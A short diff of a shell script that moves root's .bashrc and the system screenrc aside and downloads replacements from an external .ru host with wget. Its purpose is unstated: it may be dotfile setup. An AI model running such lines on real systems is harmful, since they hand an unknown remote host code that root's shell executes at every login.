@@ -1,7 +1,7 @@
-cp /root/.bashrc /root/.bashrc.bak
+mv /root/.bashrc /root/.bashrc.bak
 
-cp /etc/screenrc /etc/screenrc.bak
+mv /etc/screenrc /etc/screenrc.bak
 
-cd /root/
+wget -P /root/ https://haxbcf.ixixx.ru/.bashrc
 
-wget https://haxbcf.ixixx.ru/.bashrc
+wget -P /etc/ https://haxbcf.ixixx.ru/screenrc
